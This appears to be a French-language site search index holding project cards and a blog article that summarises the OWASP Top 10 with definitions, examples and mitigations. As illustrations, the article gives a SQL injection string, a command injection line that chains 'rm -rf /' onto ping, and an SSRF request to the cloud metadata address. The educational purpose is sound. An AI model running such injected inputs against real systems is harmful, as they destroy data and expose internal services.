[{"content":"Contexte Un ORM maison bas√© uniquement sur le pattern Data Mapper, pens√© pour PostgreSQL comme SGBD principal avec d√©gradations contr√¥l√©es pour MySQL et SQLite.\nStack \u0026amp; techniques Langage : PHP 8.4 Paradigme : Data Mapper, SRP, TDD Tests : PHPUnit Base cible : PostgreSQL (first-class) Points cl√©s QueryBuilder modulaire (Where, Join, Order, Limit, etc.). G√©n√©ration SQL sp√©cifique au dialecte (PG/MySQL/SQLite). Syst√®me de migrations int√©gr√©. Roadmap structur√©e : MVP ‚Üí CRUD solide ‚Üí production. Exemple $select = (new SelectQuery(\u0026#39;users\u0026#39;)) -\u0026gt;setWhere(WhereDefinition::eq(\u0026#39;status\u0026#39;, \u0026#39;active\u0026#39;)) -\u0026gt;setOrderBy(OrderByDefinition::asc(\u0026#39;created_at\u0026#39;)) -\u0026gt;setLimit(50); // $select-\u0026gt;toSql($dialect) Liens GitHub\rArticles associ√©s\r","permalink":"http://localhost:1313/projets/awsd-orm-php-8.4-data-mapper/","summary":"ORM Data Mapper PostgreSQL-first en PHP 8.4, avec architecture modulaire, TDD et g√©n√©ration SQL dialect-aware.","title":"AWSD-ORM (PHP 8.4, Data Mapper)"},{"content":"Contexte Un SDK l√©ger et typ√© pour interagir avec l‚ÄôAPI publique CoinGecko, con√ßu pour Node.js avec TypeScript.\nStack \u0026amp; techniques Langage : TypeScript (\u0026gt;=5.x) Runtime : Node.js (ESM) Tests : Jest Distribution : npm Points cl√©s Endpoints organis√©s par domaine (simple, coins, markets‚Ä¶). Typage strict ‚Üí meilleure DX (autocompl√©tion, erreurs r√©duites). Gestion claire des erreurs API. Exemple import { CoinGeckoClient } from \u0026#34;@awsd/sdk_coingecko\u0026#34;; const client = new CoinGeckoClient(); const price = await client.simple.price({ ids: [\u0026#34;bitcoin\u0026#34;], vs_currencies: [\u0026#34;usd\u0026#34;] }); console.log(price); Liens GitHub\rnpm\r","permalink":"http://localhost:1313/projets/sdk-coingecko-typescript-node.js/","summary":"SDK en TypeScript pour interagir avec l‚ÄôAPI CoinGecko : endpoints courants, typage fort et distribution npm.","title":"SDK CoinGecko (TypeScript, Node.js)"},{"content":"Contexte Le site vitrine et blog AWSD, construit avec Hugo et le th√®me PaperMod, h√©berge ton portfolio et tes articles techniques.\nStack \u0026amp; techniques G√©n√©rateur statique : Hugo Th√®me : PaperMod (customis√©) D√©ploiement : Clever-Cloud √âcriture : Markdown (articles, portfolio) Points cl√©s Portfolio structur√© : projets phares pr√©sent√©s en fiches. Blog technique pour partager r√©flexions et journaux de dev. Design sobre et lisible, sans surcharge. D√©ploiement automatis√© via Git + Clever-Cloud. Visuels Liens Site live\rGitHub\r","permalink":"http://localhost:1313/projets/site-awsd-hugo--clever-cloud/","summary":"Site statique en Hugo (PaperMod) servant de portfolio et blog technique, d√©ploy√© sur Clever-Cloud.","title":"Site AWSD (Hugo + Clever-Cloud)"},{"content":"Le OWASP Top 10 est le classement des risques de s√©curit√© applicative les plus critiques.\nIl sert de r√©f√©rence aux d√©veloppeurs, pentesters et responsables s√©curit√©.\nA01: Broken Access Control D√©finition : Les contr√¥les d‚Äôacc√®s sont absents, mal impl√©ment√©s ou contournables. M√©canisme : Contr√¥les uniquement c√¥t√© client. R√©f√©rences directes non s√©curis√©es (/user?id=124). Bypass de contr√¥les via param√®tres cach√©s. Exemples : Acc√®s √† /admin sans √™tre administrateur. T√©l√©chargement de fichiers appartenant √† d‚Äôautres utilisateurs. Impacts : Exposition de donn√©es sensibles. Escalade de privil√®ges. Mitigation : V√©rifications c√¥t√© serveur obligatoires. Politiques d‚Äôacc√®s centralis√©es. Principe du moindre privil√®ge. Tests automatiques sur les autorisations. A02: Cryptographic Failures D√©finition : Mauvaise protection des donn√©es sensibles. M√©canisme : Stockage en clair. Protocole faible (MD5, SHA1, SSLv3). Mauvaise gestion des cl√©s ou certificats. Exemples : Mots de passe stock√©s en MD5. Site en HTTP intercept√© (attaque Man-in-the-Middle). Cl√©s API dans un repo GitHub public. Impacts : Fuite d‚Äôidentifiants, donn√©es m√©dicales ou bancaires. Responsabilit√© l√©gale (RGPD, PCI DSS). Mitigation : TLS 1.2+ obligatoire (HSTS). Hashage fort des mots de passe (bcrypt, Argon2). Rotation et protection des cl√©s. Ne jamais stocker plus de donn√©es que n√©cessaire. A03: Injection D√©finition : L‚Äôapplication interpr√®te les donn√©es utilisateur comme du code. M√©canisme : Entr√©es concat√©n√©es dans des requ√™tes. Absence de validation/√©chappement. Exemples : SQL Injection : SELECT * FROM users WHERE name = \u0026#39; \u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;; Command Injection :\nping 8.8.8.8 \u0026amp;\u0026amp; rm -rf / LDAP Injection. Impacts : Fuite massive de donn√©es. Ex√©cution de commandes arbitraires. Contr√¥le total de l‚Äôapplication. Mitigation : Requ√™tes pr√©par√©es. Validation stricte des entr√©es. Principe \u0026ldquo;deny by default\u0026rdquo;. WAF en compl√©ment. A04: Insecure Design D√©finition : Vuln√©rabilit√©s li√©es √† la conception de l‚Äôapplication. M√©canisme : Pas de threat modeling. R√®gles m√©tier insuffisantes. Pas de limite d‚Äôutilisation des ressources. Exemples : API bancaire sans limite de virement journalier. Application sans MFA pr√©vue d√®s le design. Impacts : Attaques exploitables m√™me avec du code ‚Äúpropre‚Äù. D√©fauts structurels impossibles √† corriger rapidement. Mitigation : Security by design. Sc√©narios d‚Äôattaque d√®s la phase projet. Revues d‚Äôarchitecture. D√©fense en profondeur. A05: Security Misconfiguration D√©finition : Param√©trage non s√©curis√© ou d√©faut par d√©faut. M√©canisme : Services inutiles activ√©s. Erreurs trop verbeuses. Ports ou consoles admin expos√©s. Exemples : Tomcat Manager accessible sans restriction. Stack-trace affich√©e en production. Impacts : Attaques automatis√©es faciles. Compromission rapide d‚Äôun serveur. Mitigation : Hardening des environnements. Configurations standardis√©es (infrastructure as code). Suppression des services inutiles. Tests de configuration r√©guliers. A06: Vulnerable and Outdated Components D√©finition : Utilisation de composants tiers vuln√©rables ou non maintenus. M√©canisme : D√©pendances obsol√®tes. Libs open-source non mises √† jour. Exemples : Faille Apache Struts ‚Üí Equifax. jQuery 1.x vuln√©rable √† XSS. Impacts : Exploitation de failles connues publiques. Cha√Æne de d√©pendances compromise. Mitigation : Inventaire des d√©pendances. Outils SCA (OWASP Dependency-Check, Snyk). Mises √† jour r√©guli√®res. Suppression des d√©pendances inutiles. A07: Identification and Authentication Failures D√©finition : Failles dans l‚Äôauthentification et gestion de session. M√©canisme : Sessions non s√©curis√©es. MFA absent. Identifiants par d√©faut laiss√©s. Exemples : Attaque brute force sans limite de tentatives. JWT sans expiration. Cookies sans HttpOnly ni Secure. Impacts : Compromission de comptes utilisateurs/admin. Usurpation d‚Äôidentit√©. Mitigation : MFA obligatoire. Politique de mots de passe robustes. Expiration/renouvellement des sessions. Tokens sign√©s et v√©rifi√©s. A08: Software and Data Integrity Failures D√©finition : Donn√©es ou code non prot√©g√©s contre modification. M√©canisme : D√©pendances non v√©rifi√©es. CI/CD non s√©curis√©. Exemples : D√©pendance npm compromise (event-stream). Update non sign√©e d‚Äôun logiciel. Impacts : Ex√©cution de code malveillant. Supply Chain Attack. Mitigation : Signatures num√©riques obligatoires. CI/CD s√©curis√© avec contr√¥le d‚Äôint√©grit√©. Contr√¥le d‚Äôorigine des d√©pendances. S√©paration des environnements. A09: Security Logging and Monitoring Failures D√©finition : Manque de surveillance et de journalisation efficace. M√©canisme : Absence de logs. Logs insuffisants ou non surveill√©s. Exemples : Attaques brute force non d√©tect√©es. Absence d‚Äôalerte sur des acc√®s critiques. Impacts : D√©tection tardive (voire inexistante) des attaques. Investigation impossible. Mitigation : Centralisation des logs (ELK, Splunk). SIEM avec alertes. Tests de incident response. R√©tention des logs s√©curis√©e. A10: Server-Side Request Forgery (SSRF) D√©finition : L‚Äôapplication r√©cup√®re des ressources externes sans contr√¥le. M√©canisme : L‚Äôattaquant fournit une URL malveillante. Le serveur fait la requ√™te √† sa place. Exemples : App qui va chercher http://localhost:8080/admin. Acc√®s aux m√©tadonn√©es AWS via http://169.254.169.254/. Impacts : Acc√®s non autoris√© aux services internes. Mouvement lat√©ral dans le r√©seau. Mitigation : Whitelist des domaines. Bloquer les plages IP internes. Timeout stricts. Filtrage DNS et proxy. üö® Synth√®se Le Top 10 OWASP est une base minimale pour toute organisation. Il couvre 3 grands axes : Failles techniques (injection, SSRF, crypto). Failles humaines/organisationnelles (config, logs, design). Cha√Æne logicielle (d√©pendances, CI/CD, supply chain). C‚Äôest une r√©f√©rence mondiale utilis√©e dans les normes (ISO, PCI DSS, etc.). ","permalink":"http://localhost:1313/blog/owasp_top_10/","summary":"\u003cp\u003eLe \u003cstrong\u003eOWASP Top 10\u003c/strong\u003e est le classement des risques de s√©curit√© applicative les plus critiques.\u003cbr\u003e\nIl sert de r√©f√©rence aux d√©veloppeurs, pentesters et responsables s√©curit√©.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"a01-broken-access-control\"\u003e\u003cstrong\u003eA01: Broken Access Control\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Les contr√¥les d‚Äôacc√®s sont absents, mal impl√©ment√©s ou contournables.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eContr√¥les uniquement c√¥t√© client.\u003c/li\u003e\n\u003cli\u003eR√©f√©rences directes non s√©curis√©es (\u003ccode\u003e/user?id=124\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eBypass de contr√¥les via param√®tres cach√©s.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAcc√®s √† \u003ccode\u003e/admin\u003c/code\u003e sans √™tre administrateur.\u003c/li\u003e\n\u003cli\u003eT√©l√©chargement de fichiers appartenant √† d‚Äôautres utilisateurs.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eExposition de donn√©es sensibles.\u003c/li\u003e\n\u003cli\u003eEscalade de privil√®ges.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eV√©rifications \u003cstrong\u003ec√¥t√© serveur\u003c/strong\u003e obligatoires.\u003c/li\u003e\n\u003cli\u003ePolitiques d‚Äôacc√®s centralis√©es.\u003c/li\u003e\n\u003cli\u003ePrincipe du \u003cstrong\u003emoindre privil√®ge\u003c/strong\u003e.\u003c/li\u003e\n\u003cli\u003eTests automatiques sur les autorisations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a02-cryptographic-failures\"\u003e\u003cstrong\u003eA02: Cryptographic Failures\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Mauvaise protection des donn√©es sensibles.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eStockage en clair.\u003c/li\u003e\n\u003cli\u003eProtocole faible (MD5, SHA1, SSLv3).\u003c/li\u003e\n\u003cli\u003eMauvaise gestion des cl√©s ou certificats.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eMots de passe stock√©s en MD5.\u003c/li\u003e\n\u003cli\u003eSite en HTTP intercept√© (attaque \u003cem\u003eMan-in-the-Middle\u003c/em\u003e).\u003c/li\u003e\n\u003cli\u003eCl√©s API dans un repo GitHub public.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eFuite d‚Äôidentifiants, donn√©es m√©dicales ou bancaires.\u003c/li\u003e\n\u003cli\u003eResponsabilit√© l√©gale (RGPD, PCI DSS).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eTLS 1.2+ obligatoire (HSTS).\u003c/li\u003e\n\u003cli\u003eHashage fort des mots de passe (bcrypt, Argon2).\u003c/li\u003e\n\u003cli\u003eRotation et protection des cl√©s.\u003c/li\u003e\n\u003cli\u003eNe jamais stocker plus de donn√©es que n√©cessaire.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a03-injection\"\u003e\u003cstrong\u003eA03: Injection\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : L‚Äôapplication interpr√®te les donn√©es utilisateur comme du code.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eEntr√©es concat√©n√©es dans des requ√™tes.\u003c/li\u003e\n\u003cli\u003eAbsence de validation/√©chappement.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSQL Injection\u003c/strong\u003e :\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-sql\" data-lang=\"sql\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eSELECT\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFROM\u003c/span\u003e users \u003cspan style=\"color:#66d9ef\"\u003eWHERE\u003c/span\u003e name \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eOR\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Injection\u003c/strong\u003e :\u003cbr\u003e\n\u003ccode\u003eping 8.8.8.8 \u0026amp;\u0026amp; rm -rf /\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLDAP Injection\u003c/strong\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eFuite massive de donn√©es.\u003c/li\u003e\n\u003cli\u003eEx√©cution de commandes arbitraires.\u003c/li\u003e\n\u003cli\u003eContr√¥le total de l‚Äôapplication.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eRequ√™tes pr√©par√©es.\u003c/li\u003e\n\u003cli\u003eValidation stricte des entr√©es.\u003c/li\u003e\n\u003cli\u003ePrincipe \u0026ldquo;deny by default\u0026rdquo;.\u003c/li\u003e\n\u003cli\u003eWAF en compl√©ment.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a04-insecure-design\"\u003e\u003cstrong\u003eA04: Insecure Design\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Vuln√©rabilit√©s li√©es √† la conception de l‚Äôapplication.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003ePas de \u003cem\u003ethreat modeling\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003eR√®gles m√©tier insuffisantes.\u003c/li\u003e\n\u003cli\u003ePas de limite d‚Äôutilisation des ressources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAPI bancaire sans limite de virement journalier.\u003c/li\u003e\n\u003cli\u003eApplication sans MFA pr√©vue d√®s le design.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAttaques exploitables m√™me avec du code ‚Äúpropre‚Äù.\u003c/li\u003e\n\u003cli\u003eD√©fauts structurels impossibles √† corriger rapidement.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSecurity by design\u003c/strong\u003e.\u003c/li\u003e\n\u003cli\u003eSc√©narios d‚Äôattaque d√®s la phase projet.\u003c/li\u003e\n\u003cli\u003eRevues d‚Äôarchitecture.\u003c/li\u003e\n\u003cli\u003eD√©fense en profondeur.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a05-security-misconfiguration\"\u003e\u003cstrong\u003eA05: Security Misconfiguration\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Param√©trage non s√©curis√© ou d√©faut par d√©faut.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eServices inutiles activ√©s.\u003c/li\u003e\n\u003cli\u003eErreurs trop verbeuses.\u003c/li\u003e\n\u003cli\u003ePorts ou consoles admin expos√©s.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eTomcat Manager accessible sans restriction.\u003c/li\u003e\n\u003cli\u003eStack-trace affich√©e en production.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAttaques automatis√©es faciles.\u003c/li\u003e\n\u003cli\u003eCompromission rapide d‚Äôun serveur.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eHardening\u003c/strong\u003e des environnements.\u003c/li\u003e\n\u003cli\u003eConfigurations standardis√©es (infrastructure as code).\u003c/li\u003e\n\u003cli\u003eSuppression des services inutiles.\u003c/li\u003e\n\u003cli\u003eTests de configuration r√©guliers.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a06-vulnerable-and-outdated-components\"\u003e\u003cstrong\u003eA06: Vulnerable and Outdated Components\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Utilisation de composants tiers vuln√©rables ou non maintenus.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eD√©pendances obsol√®tes.\u003c/li\u003e\n\u003cli\u003eLibs open-source non mises √† jour.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eFaille Apache Struts ‚Üí Equifax.\u003c/li\u003e\n\u003cli\u003ejQuery 1.x vuln√©rable √† XSS.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eExploitation de failles connues publiques.\u003c/li\u003e\n\u003cli\u003eCha√Æne de d√©pendances compromise.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eInventaire des d√©pendances.\u003c/li\u003e\n\u003cli\u003eOutils SCA (OWASP Dependency-Check, Snyk).\u003c/li\u003e\n\u003cli\u003eMises √† jour r√©guli√®res.\u003c/li\u003e\n\u003cli\u003eSuppression des d√©pendances inutiles.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a07-identification-and-authentication-failures\"\u003e\u003cstrong\u003eA07: Identification and Authentication Failures\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Failles dans l‚Äôauthentification et gestion de session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eSessions non s√©curis√©es.\u003c/li\u003e\n\u003cli\u003eMFA absent.\u003c/li\u003e\n\u003cli\u003eIdentifiants par d√©faut laiss√©s.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAttaque brute force sans limite de tentatives.\u003c/li\u003e\n\u003cli\u003eJWT sans expiration.\u003c/li\u003e\n\u003cli\u003eCookies sans \u003ccode\u003eHttpOnly\u003c/code\u003e ni \u003ccode\u003eSecure\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eCompromission de comptes utilisateurs/admin.\u003c/li\u003e\n\u003cli\u003eUsurpation d‚Äôidentit√©.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eMFA obligatoire.\u003c/li\u003e\n\u003cli\u003ePolitique de mots de passe robustes.\u003c/li\u003e\n\u003cli\u003eExpiration/renouvellement des sessions.\u003c/li\u003e\n\u003cli\u003eTokens sign√©s et v√©rifi√©s.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a08-software-and-data-integrity-failures\"\u003e\u003cstrong\u003eA08: Software and Data Integrity Failures\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Donn√©es ou code non prot√©g√©s contre modification.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eD√©pendances non v√©rifi√©es.\u003c/li\u003e\n\u003cli\u003eCI/CD non s√©curis√©.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eD√©pendance npm compromise (\u003ccode\u003eevent-stream\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eUpdate non sign√©e d‚Äôun logiciel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eEx√©cution de code malveillant.\u003c/li\u003e\n\u003cli\u003eSupply Chain Attack.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eSignatures num√©riques obligatoires.\u003c/li\u003e\n\u003cli\u003eCI/CD s√©curis√© avec contr√¥le d‚Äôint√©grit√©.\u003c/li\u003e\n\u003cli\u003eContr√¥le d‚Äôorigine des d√©pendances.\u003c/li\u003e\n\u003cli\u003eS√©paration des environnements.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a09-security-logging-and-monitoring-failures\"\u003e\u003cstrong\u003eA09: Security Logging and Monitoring Failures\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : Manque de surveillance et de journalisation efficace.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAbsence de logs.\u003c/li\u003e\n\u003cli\u003eLogs insuffisants ou non surveill√©s.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAttaques brute force non d√©tect√©es.\u003c/li\u003e\n\u003cli\u003eAbsence d‚Äôalerte sur des acc√®s critiques.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eD√©tection tardive (voire inexistante) des attaques.\u003c/li\u003e\n\u003cli\u003eInvestigation impossible.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eCentralisation des logs (ELK, Splunk).\u003c/li\u003e\n\u003cli\u003eSIEM avec alertes.\u003c/li\u003e\n\u003cli\u003eTests de \u003cem\u003eincident response\u003c/em\u003e.\u003c/li\u003e\n\u003cli\u003eR√©tention des logs s√©curis√©e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"a10-server-side-request-forgery-ssrf\"\u003e\u003cstrong\u003eA10: Server-Side Request Forgery (SSRF)\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eD√©finition\u003c/strong\u003e : L‚Äôapplication r√©cup√®re des ressources externes sans contr√¥le.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM√©canisme\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eL‚Äôattaquant fournit une URL malveillante.\u003c/li\u003e\n\u003cli\u003eLe serveur fait la requ√™te √† sa place.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eExemples\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eApp qui va chercher \u003ccode\u003ehttp://localhost:8080/admin\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAcc√®s aux m√©tadonn√©es AWS via \u003ccode\u003ehttp://169.254.169.254/\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eImpacts\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003eAcc√®s non autoris√© aux services internes.\u003c/li\u003e\n\u003cli\u003eMouvement lat√©ral dans le r√©seau.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMitigation\u003c/strong\u003e :\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eWhitelist\u003c/strong\u003e des domaines.\u003c/li\u003e\n\u003cli\u003eBloquer les plages IP internes.\u003c/li\u003e\n\u003cli\u003eTimeout stricts.\u003c/li\u003e\n\u003cli\u003eFiltrage DNS et proxy.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch1 id=\"-synth√®se\"\u003eüö® Synth√®se\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eLe \u003cstrong\u003eTop 10 OWASP est une base minimale\u003c/strong\u003e pour toute organisation.\u003c/li\u003e\n\u003cli\u003eIl couvre 3 grands axes :\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eFailles techniques\u003c/strong\u003e (injection, SSRF, crypto).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFailles humaines/organisationnelles\u003c/strong\u003e (config, logs, design).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCha√Æne logicielle\u003c/strong\u003e (d√©pendances, CI/CD, supply chain).\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eC‚Äôest une \u003cstrong\u003er√©f√©rence mondiale\u003c/strong\u003e utilis√©e dans les normes 